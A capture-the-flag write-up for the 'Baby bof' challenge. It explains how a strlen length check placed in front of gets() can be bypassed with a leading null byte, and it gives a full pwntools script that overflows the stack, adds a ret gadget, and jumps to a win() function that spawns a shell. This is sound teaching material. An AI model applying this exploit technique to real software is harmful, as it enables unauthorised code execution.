# Baby bof

> People said gets is not safe, but I think I figured out how to make it safe.

Buffer overflows are a classic vulnerability, but sometimes CTF authors add little "security checks" to trip you up. In this challenge, Baby bof, the author claimed they made the dangerous `gets()` function safe. Spoiler alert: they didn't.

Here is how I analyzed the binary, found the logic flaw, and exploited it.

### Step 1: Reconnaissance (Looking Inside)

The first thing we need to do is understand how the program works. Since we were given a binary file named `chall`, we need a way to see the source code.

I didn't want to spin up a heavy reverse engineering tool immediately, so I used Dogbolt, an online decompiler explorer.

1. I visited [dogbolt.org](https://dogbolt.org/).
2. I uploaded the `chall` file.
3. I looked at the BinaryNinja output panel to see the C pseudocode.

This gave me a clean look at the logic without needing to install anything locally yet.

### Step 2: Analyzing the Code

Two functions stood out immediately.

#### The Target: `win()`

This is where we want to go. This function isn't called by the main program, but if we can jump here, it gives us a shell.

```c
int64_t win()
{
    return system("/bin/sh");
}
```

#### The Vulnerability: `main()`

Here is the main logic I found in BinaryNinja:

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    // ... setup code ...
    int64_t buf = 0;
    
    puts("What is your name: ");
    gets(&buf); // <--- DANGER!
    
    // The "Security" Check
    if (strlen(&buf) <= 0xe) 
    {
        printf("Hi, %s!\n", &buf);
        return 0;
    }
    
    puts("Thats suspicious.");
    exit(1);
}
```

The Logic Flaw:

The program uses gets(), which is notorious for buffer overflows because it reads input until it hits a newline, regardless of size. To "fix" this, the author added a check: if (strlen(\&buf) <= 0xe).

If the length of our string is greater than 14 characters (`0xe`), the program exits immediately. We need more than 14 characters to overflow the buffer and reach the Return Address. So, are we stuck?

### Step 3: The "Aha!" Moment

We can trick the program by understanding how `gets` and `strlen` treat data differently.

* `gets()`: Reads until it sees a newline (`\n`). It happily accepts Null Bytes (`\x00`).
* `strlen()`: Counts characters until it sees a Null Byte (`\x00`).

The Bypass Strategy:

If we send a payload that starts with a Null Byte (\x00), strlen will think the string length is 0 (which is less than 14). However, gets will keep writing our payload onto the stack past that null byte, allowing us to overflow the buffer and overwrite the Return Address (RIP).

### Step 4: Constructing the Exploit

I switched to my local terminal and wrote a Python script using `pwntools`. Here is the breakdown of the payload:

1. Padding: Some garbage text to start.
2. The Bypass (`\x00`): Insert a null byte early to fool `strlen`.
3. Overflow: Continue filling the stack until we hit the Return Pointer (Offset 24).
4. Stack Alignment (`RET`): This is a pro-tip. When calling `system()` (which is inside `win`), the stack must be 16-byte aligned. If it isn't, the program will crash. I added a simple `ret` instruction gadget to pad the alignment.
5. The Destination (`WIN`): The address of the `win` function.

### Step 5: The Final Script

Here is the code I used to pop the shell:

```python
from pwn import *

HOST = "target.host"
PORT = 5000

# Load the binary to get symbols automatically
elf = ELF("./chall", checksec=False)

WIN = elf.symbols["win"]
# Find a 'ret' instruction for stack alignment
RET = next(elf.search(b"\xc3")) 

context.arch = "amd64"

# --- Building the Payload ---
# 1. Start with 4 bytes of junk
payload = b"A" * 4 

# 2. THE TRICK: Null byte makes strlen think length is 4
payload += b"\x00" 

# 3. Fill the rest of the buffer up to 24 bytes (to reach RIP)
payload += b"B" * (24 - len(payload)) 

# 4. Add a RET gadget for stack alignment (prevents crashes)
payload += p64(RET) 

# 5. Overwrite RIP with the Win function address
payload += p64(WIN) 

# --- Sending it ---
io = remote(HOST, PORT)
io.recvuntil(b"What is your name:")
io.sendline(payload)
io.interactive()
```

### Result

When I ran the script, `strlen` saw a short string and let me pass. `gets` saw a long string and let me overflow the stack.

```
[*] Switching to interactive mode
$ cat flag.txt
uofctf{...}
```

Lesson Learned: You cannot secure `gets()`. Even with a length check like `strlen`, the difference in how functions handle termination characters (like null bytes) creates exploitable gaps.
